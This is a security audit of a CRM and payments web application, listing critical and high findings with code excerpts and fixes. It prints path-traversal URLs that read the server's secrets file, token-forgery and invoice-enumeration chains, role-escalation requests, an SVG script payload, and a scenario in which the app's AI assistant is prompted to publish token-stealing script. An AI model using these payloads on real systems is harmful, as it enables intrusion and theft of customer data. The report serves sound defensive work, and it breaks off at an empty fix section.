# Security Audit & Remediation Plan

**Application:** localCRM / VCSF (Craft.js site builder + CRM + payments platform)
**Audit date:** 2026-08-21
**Auditor:** Security review (application security / penetration-testing perspective)
**Codebase reviewed:** `server/` (~29,200 LOC, 69 route modules, 24 services), `client/` (React SPA), `db/schema.sql`
**Risk context:** Handles money movement, invoices, donations, recurring billing, stored payment tokens, and donor/customer PII. Does **not** store PAN/CVV (confirmed — see §5).

---

## 1. Executive summary

The application has a **thoughtfully built security core** — parameterised SQL throughout, HMAC-verified payment webhooks with constant-time comparison, capability-token receipt URLs, a real RBAC model, and no raw card data at rest. Prior review cycles are visible in the code (comments reference "Finding 10/11/13/17"), and those fixes hold up.

However, this audit found **five critical issues, any one of which results in full compromise of the system**, and a further eight high-severity issues. The most severe are:

1. **Unauthenticated arbitrary file read** (path traversal) that leaks `server/.env`, including `JWT_SECRET` — which lets an attacker forge a valid admin token. This is unauthenticated, remote, and requires a single HTTP GET.
2. **The AI assistant is a complete RBAC bypass.** Its ~20 database tools run with zero permission checks and zero row-level scoping. A logged-in *portal customer* can extract the organisation's entire financial history and PII, and write to the CRM.
3. **Privilege escalation to admin** from any account holding `users.manage`, via a single self-targeted `PUT` request.
4. **Unauthenticated mass PII harvest** by enumerating sequential invoice IDs on a legacy public endpoint that leaks per-payment receipt capability tokens.
5. **Stored XSS on the public website** reachable by any authenticated user, which steals admin JWTs from `localStorage`.

Additionally, for an application handling money there is **no multi-factor authentication of any kind** — no TOTP, no WebAuthn/passkey, no SMS fallback. Authentication is password-only with an 8-hour non-revocable bearer token.

### Risk posture

| Area | Rating | Note |
|---|---|---|
| SQL injection | **Strong** | Parameterised throughout; dynamic identifiers come from hardcoded allowlists |
| Payment webhook integrity | **Strong** | HMAC-SHA512/256, `timingSafeEqual`, fails closed |
| Card data handling | **Strong** | Tokens + last4 only; no PAN/CVV stored anywhere |
| CSRF | **Not applicable** | No cookie auth — bearer tokens only (see §6.1) |
| Public/unauthenticated surface | **Critical** | Path traversal, IDOR, record tampering |
| AI feature authorisation | **Critical** | No permission or scope enforcement |
| Privilege separation / RBAC integrity | **Critical** | Multiple self-escalation paths; fails open |
| Authentication strength | **High risk** | No MFA; no session revocation |
| XSS / output encoding | **High risk** | No sanitiser in the codebase; no CSP on the SPA |
| Rate limiting / abuse control | **High risk** | 3 of 69 route modules; broken behind a proxy |
| Dependency hygiene | **High risk** | 11 server + 10 client known vulnerabilities |

### Counts

| Severity | Count |
|---|---|
| Critical | 5 |
| High | 13 |
| Medium | 8 |
| **Total** | **26** |

---

## 2. Scope & methodology

**In scope:** server-side authorisation and authentication, all 69 API route modules, RBAC/permission model, row-level scoping, the public (unauthenticated) attack surface, payment and donation money flows, file upload/download, the AI assistant's tool surface, client-side session handling, CORS and security headers, dependency posture, and secrets management.

**Techniques applied:**
- Full enumeration of every route definition, cross-referenced against `requireAuth` / `requirePermission` coverage and blanket `router.use()` placement.
- Grep-based taint analysis for SQL string interpolation (44 sites), each manually traced to its identifier source.
- Manual review of every unauthenticated endpoint.
- **Empirical exploitation** of the path traversal (C-01) against a local Express harness reproducing the exact route and `path.join` logic — not inferred from reading.
- Row-level scope tracing through `services/scope.js` for every role, including the unknown-role path.
- `npm audit` on both workspaces.
- Review of the AI tool-execution layer for the confused-deputy / prompt-injection class the existing `SECURITY 1.md` checklist calls out.

**Out of scope (recommend follow-up):** infrastructure/network configuration, the deployed reverse proxy and TLS configuration, MySQL server hardening and at-rest encryption, backup security, live DAST against a running instance, and social-engineering resistance.

**Important caveat on C-01:** the traversal was verified against a faithful local reproduction of the route and path-joining logic. It should be re-confirmed against the deployed instance (with `STORAGE_DRIVER=local`) before and after the fix. Under `STORAGE_DRIVER=s3` the same route is not exploitable for local disk reads, but the missing containment check must be fixed regardless, since the driver is environment-controlled.

---

## 3. Critical findings

### C-01 — Unauthenticated arbitrary file read via path traversal → full system compromise

**Severity: Critical** · CWE-22 · Unauthenticated · Remote
**Location:** [server/src/routes/media.js:86](../server/src/routes/media.js#L86), [server/src/services/storage.js:42](../server/src/services/storage.js#L42)

The public media route passes the URL wildcard straight into the storage layer, which does an unguarded `path.join`:

```js
// routes/media.js:86 — deliberately unauthenticated
router.get('/file/*', async (req, res) => {
  const key = req.params[0];                                  // attacker-controlled
  const got = await storage.getReadable({ driver: storage.driver, key });
```
```js
// services/storage.js:42 — no normalisation, no containment check
function localStream(key) {
  const dest = path.join(LOCAL_ROOT, key);
  return fs.createReadStream(dest);
}
```

Express URL-decodes the wildcard parameter, so percent-encoded traversal sequences survive into `path.join`.

**Verified exploitation** (reproduced locally against the exact route + join logic):

| Request | Resolved path | Escapes root |
|---|---|---|
| `/api/website/media/file/%2e%2e%2f%2e%2e%2fserver/.env` | `…/vscf-craftjs-main/server/.env` | **yes** |
| `/api/website/media/file/..%2f..%2f.env` | `…/vscf-craftjs-main/.env` | **yes** |
| `/api/website/media/file/..%2F..%2F..%2Fserver%2F.env` | `/Users/lcars/Downloads/server/.env` | **yes** |

Note that the *unencoded* form (`../../.env`) is normalised away by Express's router before it reaches the handler — which is likely why this was missed. The encoded form is not.

**Impact — this is a full compromise chain:**

```
GET /api/website/media/file/%2e%2e%2f%2e%2e%2fserver/.env   (no auth)
   → discloses JWT_SECRET, DB_PASSWORD, DB_HOST/PORT/USER/NAME
   → attacker signs their own JWT: { sub: <admin user id> }
   → requireAuth validates it (correct signature, active user)
   → full administrative access: all contacts, invoices, payments,
     donations, vault profiles, gateway settings, user management
```

`server/.env` currently holds `JWT_SECRET`, `DB_PASSWORD`, and database connection details. If `DB_HOST` is ever network-reachable, direct database access follows. The same primitive also reads any other file the Node process can — application source, SSH keys, cloud credential files.

**Fix (defence in depth — apply all three layers):**

1. **Containment check in the storage layer** (the authoritative fix — protects every caller):

```js
function safeLocalPath(key) {
  const dest = path.resolve(LOCAL_ROOT, key);
  // path.relative is the reliable containment test — it handles symlink-free
  // traversal, absolute-path keys, and Windows separators.
  const rel = path.relative(LOCAL_ROOT, dest);
  if (rel === '' || rel.startsWith('..') || path.isAbsolute(rel)) {
    throw Object.assign(new Error('Invalid storage key'), { status: 400 });
  }
  return dest;
}
function localStream(key) { return fs.createReadStream(safeLocalPath(key)); }
async function localPut({ key, buffer }) { /* use safeLocalPath(key) */ }
async function localDelete(key) { /* use safeLocalPath(key) */ }
```

2. **Validate the key shape at the route boundary.** Keys are generated by `buildKey()` as `entity/id/YYYY-MM-DD/<40 hex><ext>`, so they are strictly constrained:

```js
const KEY_RE = /^[a-z0-9_-]+\/[a-z0-9_-]+\/\d{4}-\d{2}-\d{2}\/[a-f0-9]{40}(\.[a-z0-9]{1,8})?$/i;
router.get('/file/*', async (req, res) => {
  const key = req.params[0];
  if (!KEY_RE.test(key)) return res.status(400).end();
  ...
```

3. **Serve only keys the database knows about.** Look the key up in `media_files.filename` before streaming; refuse anything unregistered. This removes attacker control over the path entirely.

**Post-fix required actions — treat the current secrets as compromised:**
- Rotate `JWT_SECRET` (this invalidates all existing sessions — intended).
- Rotate the MySQL password and every gateway credential in `payment_gateway_settings`.
- Rotate any SMTP, Twilio, Anthropic, and Google OAuth credentials.
- Review access logs for requests matching `/api/website/media/file/` containing `%2e` or `..`.

---

### C-02 — AI assistant bypasses the entire permission and row-scope model

**Severity: Critical** · CWE-862 / CWE-863 (confused deputy) · Any authenticated user
**Location:** [server/src/routes/ai.js:17](../server/src/routes/ai.js#L17), [server/src/services/ai.js:392](../server/src/services/ai.js#L392)

`POST /api/ai/chat` is gated by `requireAuth` **only** — no `requirePermission`, no role check, no rate limit:

```js
// routes/ai.js:12-17
router.use(requireAuth);            // ← the only gate
router.post('/chat', async (req, res, next) => { ... });
```

The tool executor receives `userId` but uses it **exclusively as an authorship stamp** (`author_id`, `created_by`, `owner_id`). It performs **no permission check and no row-level scoping** on any of its ~20 tools:

```js
// services/ai.js:392 — userId is never used for authorisation
async function executeTool(name, input, userId) {
  switch (name) {
    case 'get_revenue_summary': {
      const [[revenue]] = await db.query(`
        SELECT ROUND(SUM(amount - COALESCE(fee_amount,0)),2) AS net_revenue, ...
          FROM payments WHERE status IN ('captured','authorized') AND ${periodSQL}`);
      return { period, ...revenue };        // ← entire organisation, every caller
    }
```

**Read tools with no authorisation:** `get_invoice_summary`, `get_revenue_summary`, `get_contact_stats`, `get_deal_pipeline`, `get_subscription_stats`, `get_task_summary`, `get_overdue_invoices`, `get_recent_contacts`, `get_top_clients`, `get_payment_history`, `search_contacts` (returns name, email, phone, organisation for any match).

**Write tools with no authorisation:** `create_contact`, `create_deal`, `create_task`, `complete_task`, `save_blog_draft`, `save_social_draft`, `save_email_template`, `update_blog_post` (**including `status: 'published'`** — live public website content).

**Impact:**
- A **portal customer** — a role deliberately restricted by `getScope()` to their own invoices — can ask the assistant for total revenue, top clients, overdue invoices, and payment history, and search all contacts. Every server-side scope check in `services/scope.js` and `routes/portal.js` is bypassed through this one endpoint.
- A **sales agent** restricted to their own records by `resolveOwnerScope` gets full-database reads the same way.
- Any authenticated user can **write** CRM records and **publish content to the public website** without `contacts.write`, `deals.write`, or `settings.manage`.
- No rate limit means unbounded Anthropic API spend (financial DoS) and unbounded database load.
- The system prompt (`services/ai.js:74`) instructs the model to *"use the action tools directly"* for action requests — there is **no human-in-the-loop confirmation** before a write, which `SECURITY 1.md §2` explicitly requires.
- Knowledge-base articles and database content flow into the model's context, creating a prompt-injection path to those write tools.

**Fix:**

1. **Gate the endpoint and scope every tool.** Pass the full `req.user` (not just the id) into `streamChat` → `executeTool`, and enforce per-tool permission + row scope:

```js
const TOOL_POLICY = {
  get_revenue_summary: { perm: 'reports.read',   scope: 'global' },
  get_payment_history: { perm: 'payments.read',  scope: 'owner'  },
  search_contacts:     { perm: 'contacts.read',  scope: 'owner'  },
  create_contact:      { perm: 'contacts.write', scope: 'owner', confirm: true },
  update_blog_post:    { perm: 'settings.manage', scope: 'global', confirm: true },
  // ... one entry per tool; a tool with no entry is DENIED
};

async function executeTool(name, input, user) {
  const policy = TOOL_POLICY[name];
  if (!policy) return { error: 'Tool not available' };
  if (!userHasPermission(user, policy.perm)) {
    return { error: 'You do not have permission to do that.' };
  }
  const scopeIds = policy.scope === 'owner' ? await resolveOwnerScope(user) : null;
  // thread scopeIds into every query via ownerClause()/contactOwnerClause()
}
```

2. **Filter the advertised tool list per caller.** Only send the model the tool definitions the caller is actually permitted to use — the model should never be offered a capability the user lacks.

3. **Block the `portal` role from `/api/ai/chat` entirely**, or give portal users a separate assistant whose tools are hard-scoped to `getScope()`.

4. **Require human confirmation for every mutating tool.** Return a proposed action to the client for explicit user approval; execute only on a second, authenticated call. This closes the prompt-injection path to writes.

5. **Rate limit** the endpoint (e.g. 20 requests / 5 min / user) and add per-user token/cost accounting with alerting.

6. **Audit-log every AI tool invocation** with actor, tool, arguments, and result, per `SECURITY 1.md §4`.

---

### C-03 — Privilege escalation to administrator via self-service role assignment

**Severity: Critical** · CWE-269 · Requires any account with `users.manage`
**Location:** [server/src/routes/users.js:141](../server/src/routes/users.js#L141), [server/src/routes/users.js:107](../server/src/routes/users.js#L107), [server/src/services/scope.js:44](../server/src/services/scope.js#L44)

**Vector A — self-promotion (single request).** `PUT /api/users/:id` accepts arbitrary `role_ids` and performs a scope check that **includes the caller themselves**:

```js
// users.js:141
router.put('/:id', requirePermission('users.manage'), async (req, res, next) => {
  const scopeIds = await resolveOwnerScope(req.user);
  if (scopeIds !== null && !scopeIds.includes(id)) {         // ← caller's own id IS in scope
    return res.status(403).json({ error: 'Outside your management scope' });
  }
  ...
  if (data.role_ids) {                                       // ← no check on WHICH roles
    await db.query('DELETE FROM user_roles WHERE user_id = :id', { id });
    const values = data.role_ids.map((rid) => [id, rid]);
    await db.query('INSERT INTO user_roles (user_id, role_id) VALUES ?', [values]);
  }
```

`resolveOwnerScope` seeds its recursive CTE with the caller's own row (`services/scope.js:46`: `SELECT id FROM users WHERE id = :me`), so a manager is always inside their own scope.

```
PUT /api/users/<own id>   { "role_ids": [<admin role id>] }
   → caller is now an administrator
```
The admin role id is readily obtainable — `GET /api/roles` requires only `roles.manage`, and role ids are low sequential integers.

**Vector B — create a privileged account.** `POST /api/users` (users.js:107) has **no scope check at all** and accepts arbitrary `role_ids`. A `manager`/`sales_manager` creates a new user with the admin role and a password they choose, then logs in as it. Worse, `manager_id` auto-defaults to the creator (users.js:112), so the new admin is also the creator's direct report — making it impersonable via `POST /:id/impersonate` without even needing the password.

**Vector C — lateral takeover.** `PUT /api/users/:id` accepts `password` for any user in scope, letting a manager silently reset a report's password and log in as them. Legitimate for support workflows, but it must be audit-logged and notify the affected user; currently it does neither.

**Impact:** the boundary between `users.manage` and `admin` does not exist. Any account with user-management rights is effectively an administrator, defeating the whole RBAC design.

**Fix:**

1. **No self-modification of roles.** Reject `role_ids` when `id === req.user.id`, unconditionally.
2. **Grantable-role allowlist.** A caller may only assign roles that are a strict subset of what they already hold, unless they are `admin`. Introduce an explicit `roles.grant_admin` permission held only by `admin`, and refuse to assign any role carrying permissions the caller lacks.
3. **Scope-check creation too.** Apply the same `resolveOwnerScope` check in `POST /`, and force `manager_id` to the creator for non-admins (do not let them pick).
4. **Separate password resets from profile edits.** Move admin-initiated resets to a dedicated endpoint that emails a reset link rather than setting a password directly; audit-log it and notify the account owner.
5. **Audit-log every role change** with actor, target, before/after role sets — and make that write non-optional (see M-07).

---

### C-04 — Unauthenticated mass PII and financial data harvest via enumerable invoice IDs

**Severity: Critical** · CWE-639 (IDOR) · Unauthenticated
**Location:** [server/src/routes/payments.js:177](../server/src/routes/payments.js#L177)

A legacy public endpoint takes a sequential integer invoice id. Its comment states PII is deliberately omitted — but the response includes the payment's `receipt_token`:

```js
// payments.js:177 — "PII (contact name, email) is intentionally OMITTED"
router.get('/public/invoice/:id', async (req, res, next) => {
  const id = Number(req.params.id);
  const [[invoice]] = await db.query(`SELECT i.id, i.invoice_number, ..., i.total,
    i.amount_paid, i.balance_due, i.status, i.memo, o.name AS organization_name
    FROM invoices i ... WHERE i.id = :id`, { id });
  const [[latestPayment]] = await db.query(
    `SELECT id, amount, status, received_at, created_at, receipt_token   -- ← capability token
       FROM payments WHERE invoice_id = :id ...`, { id });
  res.json({ invoice, line_items: lines, latest_payment: latestPayment || null });
```

The `receipt_token` is the capability that guards the public receipt endpoints (`payments.js:370-400`), whose data loader (`services/receipts.js:43`) returns **exactly the PII this endpoint claims to withhold**: `contact_name`, `contact_email`, `contact_phone`, organisation postal address, plus `p.*` from `payments` — `card_last4`, `card_brand`, `card_holder_name`, `billing_address`, `avs_result`, `cvv_result`.

**Verified exploitation:**
```
for id in 1..N:
    GET /api/payments/public/invoice/$id          # no auth, sequential
        → latest_payment.receipt_token
    GET /api/payments/public/receipt/by-token/$token
        → donor/customer name, email, phone, billing address,
          card brand + last4, cardholder name, amount, invoice memo
```
The token-based design (256-bit `receipt_token`, deliberately introduced to stop exactly this enumeration) is fully defeated because the token is handed out by an enumerable endpoint.

**Secondary impacts:** every invoice's financial detail (total, balance due, memo, line-item descriptions) and the organisation name leak for all N invoices; and each request writes `invoices.viewed_at`, corrupting the "customer viewed this invoice" audit signal across the entire invoice table.

**Fix:**

1. **Remove `receipt_token` from this response.** Minimum viable fix — one line.
2. **Delete the endpoint.** The comment says it exists only for pay-links sent before the token scheme. Confirm from `invoices` whether any pre-token invoice is still unpaid; if so, migrate those links, then remove the route. Retiring it also stops the financial-detail leak and the `viewed_at` pollution.
3. **If it must survive during migration:** require `?token=` matching `invoices.payment_token`, cap it to unpaid invoices, add a rate limit, and stop writing `viewed_at` from it.
4. **Audit:** review access logs for sequential scans of `/api/payments/public/invoice/`. If found, this is a reportable personal-data breach under GDPR/CCPA — engage counsel.

---

### C-05 — Stored XSS on the public website → admin session theft

**Severity: Critical** · CWE-79 + CWE-522 · Any authenticated user
**Location:** [server/src/services/ai.js:365](../server/src/services/ai.js#L365), [client/src/pages/public/BlogPostPage.jsx:112](../client/src/pages/public/BlogPostPage.jsx#L112), [client/src/auth/AuthContext.jsx:37](../client/src/auth/AuthContext.jsx#L37)

The AI's markdown-to-HTML converter performs **no escaping whatsoever** — arbitrary input is wrapped in tags and stored:

```js
// services/ai.js:365 — no escaping of `t`
function markdownToHtml(text) {
  return (text || '').split(/\n{2,}/).filter((p) => p.trim()).map((p) => {
    const t = p.trim();
    if (t.startsWith('### ')) return `<h3>${t.slice(4)}</h3>`;
    ...
    return `<p>${t.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>').replace(/\n/g, '<br>')}</p>`;
  }).join('\n');
}
```

Its output goes to `blog_posts.body_html` via the `save_blog_draft` and `update_blog_post` tools, and the public blog page renders that field raw:

```jsx
// client/src/pages/public/BlogPostPage.jsx:112
<div dangerouslySetInnerHTML={{ __html: processBodyHtml(post.body_html) }} />
```

There is **no HTML sanitiser anywhere in the codebase** — no DOMPurify, no `sanitize-html`, in either `package.json`. There are 7 `dangerouslySetInnerHTML` sites (`ProductDetail`, `InlineText`, `Tabs`, `Accordion`, `CardGrid`, `ProductPage`, `BlogPostPage`), all rendering database-sourced HTML unsanitised.

**Full chain (combines with C-02):**
```
Any authenticated user (incl. portal customer)
  → POST /api/ai/chat: "update blog post 3, set content to <script>…</script>,
                        status published"                      (C-02: no perm check)
  → markdownToHtml stores the payload verbatim in body_html
  → published on the public blog page, rendered via dangerouslySetInnerHTML
  → an administrator views the page
  → script reads localStorage['lc_token'] and exfiltrates it
  → attacker replays the bearer token as that administrator
```

The final step works because the JWT is stored in `localStorage` (`AuthContext.jsx:37`), readable by any script on the origin, and because **no CSP** is served for the SPA (`client/vercel.json` sets only `Cache-Control`; helmet's CSP applies to API responses, not the statically-hosted client).

**Fix:**

1. **Sanitise on write and on render.** Add `isomorphic-dompurify` server-side and sanitise every HTML field before persisting (`blog_posts.body_html`, `products.description`, builder node text); add DOMPurify client-side at all 7 `dangerouslySetInnerHTML` sites as defence in depth. Use a strict allowlist — no `<script>`, no `<iframe>`, no `on*` attributes, no `javascript:`/`data:` URLs.
2. **Escape in `markdownToHtml`.** HTML-escape `t` before applying the markdown transforms.
3. **Ship a Content-Security-Policy** for the SPA (see H-13) — this alone would have broken the exfiltration step.
4. **Move the session token out of `localStorage`** — see H-05.

---

## 4. High-severity findings

### H-01 — No multi-factor authentication of any kind
**CWE-308** · [server/src/routes/auth.js](../server/src/routes/auth.js)

A codebase-wide search for `webauthn|passkey|totp|2fa|mfa|authenticator|otpauth` across `server/`, `client/`, and `db/schema.sql` returns **zero implementation** (the only hit is unrelated prose in `kbSeeder.js`). Authentication is password-only, minimum 8 characters (6 for admin-set passwords — see M-04), with no complexity requirement and no breached-password check.

For an application with access to donor PII, stored payment tokens, and the ability to charge saved cards, a single stolen or phished password grants complete access. This is also a hard blocker for SOC 2 and for most payment-partner security reviews.

**Fix — see the phased design in §7.**

### H-02 — IDOR: any authenticated user can read notes on any contact, organisation, or deal
**CWE-639** · [server/src/routes/notes.js:12](../server/src/routes/notes.js#L12)

```js
router.use(requireAuth);
router.get('/', async (req, res, next) => {          // ← no requirePermission, no scope check
  const { entity_type, entity_id } = req.query;      // ← neither value validated
  const [rows] = await db.query(
    `SELECT n.*, ... FROM notes n ... WHERE n.entity_type = :et AND n.entity_id = :eid ...`,
    { et: entity_type, eid: entity_id });
```

`POST` and `DELETE` on the same router require `notes.write`, but the read has no gate at all. Any authenticated user — **including a portal customer** — can iterate `entity_id` and read every internal note in the system. Notes routinely contain sensitive commentary: negotiation positions, payment problems, personal circumstances.

**Fix:** add `requirePermission('notes.read')`, validate `entity_type` against an enum, and verify the caller can access the parent entity by loading it and applying `resolveOwnerScope` — mirroring the pattern already correct in `contacts.js:191`.

### H-03 — IDOR: attachment downloads have no row-level scope check
**CWE-639** · [server/src/routes/attachments.js:116](../server/src/routes/attachments.js#L116)

```js
router.get('/:id/download', async (req, res, next) => {
  const [rows] = await db.query('SELECT * FROM attachments WHERE id = :id LIMIT 1', { id: req.params.id });
  const a = rows[0];
  if (!a) return res.status(404).json({ error: 'Not found' });
  if (!permFor(req.user, ENTITY_READ_PERM[a.entity_type])) return res.status(403).json({ error: 'Forbidden' });
  // ← no resolveOwnerScope check on the parent entity
```

The check is coarse (does the caller hold `contacts.read`?) but not row-level. A sales agent scoped to their own contacts can enumerate `/:id/download` and retrieve attachments belonging to any contact in the organisation — contracts, statements, identity documents.

**Fix:** after loading the attachment, load its parent entity and apply `resolveOwnerScope` against the parent's `owner_id`. Apply the same fix across `activities.js`, `households.js`, `lists.js`, and `customReports.js`, none of which reference `resolveOwnerScope`.

### H-04 — Unauthenticated tampering with financial records + receipt token leak
**CWE-639 / CWE-284** · [server/src/routes/donations.js:234](../server/src/routes/donations.js#L234)

```js
router.post('/public/finalize/:invoiceId', async (req, res, next) => {   // no auth
  const invoiceId = Number(req.params.invoiceId);
  const body = req.body || {};
  const [[invoice]] = await db.query('SELECT id, contact_id, organization_id FROM invoices WHERE id = :id', { id: invoiceId });
  const [[payment]] = await db.query(`SELECT id, amount, receipt_token FROM payments
      WHERE invoice_id = :id AND status IN ('captured','authorized') ORDER BY id DESC LIMIT 1`, { id: invoiceId });
  ...
  return res.json({ ok: true, donation: existingDonation, receipt_token: payment.receipt_token });
```

Unauthenticated, with an enumerable integer id and no proof the caller owns the invoice. An attacker can:
- **Harvest `receipt_token`** for any captured payment — a second path to the C-04 PII chain.
- **Reclassify arbitrary payments as donations**, attaching an attacker-chosen `fund_id`, `soft_credit_contact_id`, `dedication_note`, and `is_anonymous`. This corrupts financial reporting and, for a nonprofit, tax-receipting and year-end statements.
- **Trigger emails to arbitrary contacts** via `notifyDonationCaptured`, using the real organisation's identity.

**Fix:** require the invoice's `payment_token` (or the payment's `receipt_token`) as proof of possession, matching how the rest of the public payment surface already works; never return `receipt_token` unless the caller proved possession of a token in the first place; add a rate limit; and validate `soft_credit_contact_id` and `fund_id` as existing records.

### H-05 — No session revocation; bearer tokens in `localStorage`
**CWE-613 / CWE-522** · [server/src/middleware/auth.js:20](../server/src/middleware/auth.js#L20), [client/src/auth/AuthContext.jsx:37](../client/src/auth/AuthContext.jsx#L37)

A search for `jti|denylist|blacklist|token_version|revoke` finds no token-revocation mechanism. Consequences:

- **Logout is cosmetic.** `POST /api/auth/logout` writes an activity row and returns; the token stays valid for its full 8 hours. A token captured from a shared machine works after the user "logs out".
- **Password reset does not invalidate sessions.** After a compromise-driven reset, the attacker's existing token keeps working for up to 8 hours.
- **Impersonation tokens (2h) cannot be revoked**, and the audit trail is wrong: `users.js:216` signs `{ ...target, impersonating_as: targetId }`, so `sub` and `impersonating_as` are both the *target*. In `middleware/auth.js:48`, `user.impersonated_by = decoded.sub` therefore records the target, not the acting manager — impersonated actions are indistinguishable from the user's own.
- Tokens in `localStorage` are readable by any XSS on the origin (see C-05).

Deactivating a user *does* take effect immediately (`requireAuth` re-checks `is_active` every request) — that part is correct.

**Fix:**
1. Add a `jti` claim plus a `revoked_tokens` table (or Redis set) keyed on `jti` with the token's expiry as TTL; check it in `requireAuth`. Have logout insert the `jti`.
2. Add `users.token_epoch` (integer). Include it as a claim; reject tokens whose epoch is stale. Bump it on password reset, role change, and forced logout — this invalidates all of a user's sessions at once, cheaply.
3. Fix the impersonation claims: `signToken({ id: req.user.id, email: req.user.email }, { impersonating_as: targetId, expiresIn: '15m' })` so `sub` is the real actor. Shorten the lifetime and log `impersonate_end`.
4. Shorten access tokens to 15–30 minutes and add a refresh token in an `HttpOnly; Secure; SameSite=Strict` cookie. This removes the token from JavaScript reach entirely. Note this introduces CSRF exposure for the refresh endpoint — pair it with a double-submit CSRF token (see §6.1).

### H-06 — `trust proxy` not configured: rate limiting is ineffective behind a proxy
**CWE-348** · [server/src/index.js](../server/src/index.js)

`app.set('trust proxy', …)` appears nowhere. Behind Vercel, nginx, Cloudflare, or any load balancer, `req.ip` is the proxy's address for every client. Effects:

- The login limiter is keyed `ip|email` (`auth.js:34`), so the per-email component still throttles a single-account attack — but **credential stuffing across many accounts is unthrottled**, since each email gets its own bucket and the shared IP contributes nothing.
- The forgot-password limiter (`auth.js:126`) and portal register limiter (`portal.js:139`) key on IP alone, so they collapse into a **single global bucket of 5 per 15 minutes** — simultaneously useless as a control and a trivial denial-of-service against all legitimate users.
- `x-forwarded-for` is read directly and stored as the customer IP in payment records (`payments.js:313`, `525`, `683`, `805`; `forms.js:133`) with no proxy validation, so those forensic records are attacker-spoofable.

**Fix:** set `app.set('trust proxy', <exact number of trusted proxy hops>)` — a specific hop count, never `true`, which lets clients spoof `x-forwarded-for` freely. Then use `req.ip` everywhere instead of parsing the header manually. Verify by asserting `req.ip` matches the real client address from a known external host.

### H-07 — No global rate limiting across ~500 endpoints
**CWE-770** · [server/src/index.js](../server/src/index.js)

Rate limiting exists in only 3 of 69 route modules (`auth.js`, `portal.js`, `payments.js`). Unprotected high-risk endpoints include:

| Endpoint | Abuse |
|---|---|
| `POST /api/ai/chat` | Unbounded LLM spend; database load |
| `POST /api/forms/public/:slug/submit` | Spam; unbounded contact + submission rows |
| `POST /api/donations/public/checkout` | Card testing / carding via the payment gateway |
| `POST /api/events/public/checkin/:eventId/scan` | 6-digit PIN brute force (H-08) |
| `GET /api/website/search` | Five `LIKE '%…%'` full scans per request — DoS |
| `POST /api/cart/items` | Ticket-hold exhaustion (denial of inventory) |
| `POST /api/auth/reset-password` | Unlimited reset-token guessing |

**Fix:** apply a global baseline limiter (e.g. 300 req/min/IP) in `index.js` before the route mounts, then tighter per-route limits on the table above. Key authenticated routes on user id, unauthenticated ones on `req.ip` (after H-06). Add a hard cap and Anthropic cost budget for `/api/ai/chat`.

### H-08 — Event check-in PIN: 6 digits, unlimited attempts, non-constant-time compare
**CWE-307** · [server/src/routes/events.js:239](../server/src/routes/events.js#L239), [server/src/routes/volunteers.js:116](../server/src/routes/volunteers.js#L116)

```js
const pin = String(crypto.randomInt(100000, 999999));      // events.js:412 — 900k space
...
if (!event || !event.checkin_pin || event.checkin_pin !== pin) {   // events.js:246
  return res.status(403).json({ error: 'Invalid check-in PIN' });
}
```

Two unauthenticated endpoints accept this PIN with **no rate limiting**. At a modest 100 requests/second the full 900,000-value space is exhausted in about 2.5 hours; the expected hit is ~75 minutes. The comparison is also not constant-time (a minor concern over a network, but free to fix).

**Impact:** fraudulent event check-in, admission without a valid ticket, and corrupted attendance records for a paid event.

**Fix:** rate limit per `eventId` (e.g. 10 attempts / 15 min) with lockout and staff alerting; lengthen the PIN to 8+ characters from a mixed alphabet; compare with `crypto.timingSafeEqual`; expire the PIN automatically after the event's end date; store a hash rather than the plaintext PIN.

### H-09 — Role-name-based admin bypass allows escalation via role rename
**CWE-269** · [server/src/middleware/auth.js:83](../server/src/middleware/auth.js#L83), [server/src/routes/roles.js:78](../server/src/routes/roles.js#L78)

The permission gate bypasses all checks based on the role's **name string**:

```js
// middleware/auth.js:83
if (req.user.roles?.includes('admin')) return next();
```

But `PUT /api/roles/:id` lets any `roles.manage` holder rename any role, with no protection for system roles:

```js
// roles.js:78
router.put('/:id', requirePermission('roles.manage'), async (req, res, next) => {
  const data = saveSchema.parse(req.body);
  await db.query('UPDATE roles SET name = :name, description = :description WHERE id = :id', ...);
```

Two escalation paths:
- `PUT /api/roles/<my own role id>  { "name": "admin" }` → every member of that role, including the caller, gains the full admin bypass.
- `PUT /api/roles/<my own role id>  { "permission_ids": [<all ids from GET /meta/permissions>] }` → the caller grants themselves every permission in the system.

There is also nothing preventing deletion or renaming of the real `admin` role, which could lock every administrator out.

**Fix:** add an `is_system` flag to `roles`, set it on `admin`/`portal`/`readonly`, and reject rename, permission changes, and deletion for system roles. Replace the name-based bypass with a permission-based one (`p.key = '*'` or an explicit `admin.all` permission). Forbid a caller from modifying any role they themselves hold, and from granting permissions they do not have. Audit-log every role change.

### H-10 — Row-level scoping fails open for unrecognised roles
**CWE-1220** · [server/src/services/scope.js:64](../server/src/services/scope.js#L64)

```js
// Fallback: no restriction (e.g. future roles not yet categorised)
return null;                                   // null = UNRESTRICTED access
```

`resolveOwnerScope` returns `null` — meaning *see everything* — for any role not explicitly listed. Since `POST /api/roles` lets operators create arbitrary new roles, every custom role silently receives **unrestricted row-level access** to contacts, deals, tasks, invoices, and subscriptions. An operator creating a deliberately narrow "Intern" role would unknowingly grant full-database visibility.

**Fix:** invert the default — return `[user.id]` (own records only) for unrecognised roles, and log a warning naming the uncategorised role. Better: add a `scope_type` column to `roles` (`global` / `reports` / `own`) so scoping is explicit data rather than a hardcoded name list, and make it a required field at role creation.

### H-11 — Upload validation trusts the client-supplied MIME type; SVG permitted
**CWE-434** · [server/src/routes/media.js:18](../server/src/routes/media.js#L18), [server/src/routes/cmsData.js:42](../server/src/routes/cmsData.js#L42)

```js
fileFilter: (_req, file, cb) => {
  const ALLOWED = ['image/jpeg','image/png','image/gif','image/webp','image/svg+xml',
                   'application/pdf','video/mp4','video/webm'];
  if (ALLOWED.includes(file.mimetype)) return cb(null, true);   // ← client-declared value
```

`file.mimetype` comes from the multipart `Content-Type` header — entirely attacker-controlled. There is no magic-byte/content inspection and no extension check. Issues:

- **SVG is explicitly allowed.** SVG is an active content format: `<svg><script>alert(1)</script></svg>`. `GET /api/website/media/file/*` serves stored objects without setting `Content-Type` at all, so the browser sniffs — a stored `.svg` can execute script on the API origin. (`cmsData.js`'s serve route defaults unknown extensions to `image/jpeg`, which happens to blunt this there, but by accident rather than design.)
- Any file type can be uploaded by declaring an allowed MIME (`sharp` only re-encodes the four raster types, so PDFs, videos, and SVGs are stored byte-for-byte).
- No malware scanning on a surface the application description calls out (`uploads … analyzed and don't allow malicious files`).
- `attachments.js:116` handles this correctly — always `application/octet-stream` with `Content-Disposition: attachment` and a sanitised filename. The media routes should match.

**Fix:**
